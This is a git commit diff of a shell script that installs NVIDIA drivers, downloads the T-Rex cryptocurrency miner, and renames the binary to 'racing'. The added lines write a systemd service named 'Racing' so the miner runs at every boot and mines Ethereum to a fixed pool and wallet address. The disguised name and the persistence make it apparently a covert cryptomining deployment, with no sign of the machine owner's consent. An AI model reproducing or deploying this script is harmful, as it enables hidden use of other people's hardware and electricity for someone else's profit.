6b3700d094f82124337009693c0f52aeaba34481
Praveen <80373260+NanoTest5000@users.noreply.github.com>
2022-06-03 21:36:27 +0000

    Update v2222.sh

--- v2222.sh
+++ v2222.sh
@@ -8,12 +8,14 @@ sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution
 sudo dpkg -i cuda-keyring_1.0-1_all.deb
 sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
 sudo apt-get update
+sudo apt --fix-broken install
 sudo apt-get -y install cuda-drivers-510
 sudo apt --fix-broken install
 sudo apt-get install libcurl3 -y
 sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 sudo tar xvzf t-rex-0.21.6-linux.tar.gz
 sudo mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x -w rog
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x -w foundercc11
